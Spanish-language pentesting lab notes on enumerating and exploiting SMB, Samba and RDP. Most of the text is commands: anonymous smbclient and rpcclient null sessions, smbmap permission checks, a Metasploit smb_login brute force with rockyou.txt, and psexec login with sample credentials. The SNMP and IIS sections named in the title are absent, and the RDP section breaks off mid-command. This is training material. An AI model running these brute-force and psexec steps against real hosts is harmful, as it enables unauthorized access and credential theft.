---
icon: '5'
---

# Enumeración y Explotación del Protócolo SMB, SAMBA, SNMP, IIS y RDP

## Enumeración y Explotación Básica del Protocolo SMB (Puerto 445)

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

Iniciar sesión sino conocemos usuario, es decir, como anónimo.

```
smbclient -L <IP máquina víctima> -N
```

Si conocemos el usuario con su contraseña.

```bash
smbclient -L //<IP máquina víctima> -U 'nombre' 
```

Con la herramienta `smbclient` no se a priori cuál tengo permisos o no. Por lo que usamos `smbmap` para ello.

```bash
smbmap -H <IP máquina víctima> -u 'nombre' -p 'contraseña'
```

Para entrar en un recurso compartido.

```bash
smbclient -U 'mario' //<IP máquina víctima>/Users
```

## Enumeración y Explotación Básica del Protocolo SMB con Metasploit

{% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}

```bash
msfconsole 
use /auxiliary/scanner/smb/smb_login
show options
set RHOSTS <IP máquina víctima>
set VERBOSE false #esto hace que vaya más lento si es true
set SMBUser mario
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Probar si tenemos acceso en la máquina víctima con este módulo.

```bash
use /exploit/windows/smb/psexec
show options
set RHOSTS <IP máquina víctima>
set SMBUser mario
set SMBPass 123123
run
```

## Enumeración de Usuarios SAMBA y uso de RPCCLIENT

{% embed url="https://vulnyx.com/#discover" %}

```bash
rpcclient -U "" -N <IP máquina víctima>
```

Comandos importantes.

```bash
srvinfo
querydispinfo
enumdomusers
```

```
msfconsole 
show options
set RHOSTS <IP máquina víctima>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
set SMBUser ken
run
```

```bash
smbmap -H <IP máquina víctima> -u 'ken' -p 'kenken' -r ken
```

## Protocolo RDP en Windows y Enumeración Básica del Sistema

{% embed url="https://tryhackme.com/r/room/investigatingwindows" %}

El RDP es **un protocolo que permite usar un ordenador de escritorio a distancia desde otro ordenador.**

```
xfreerdp /u:Administrator /p:
```

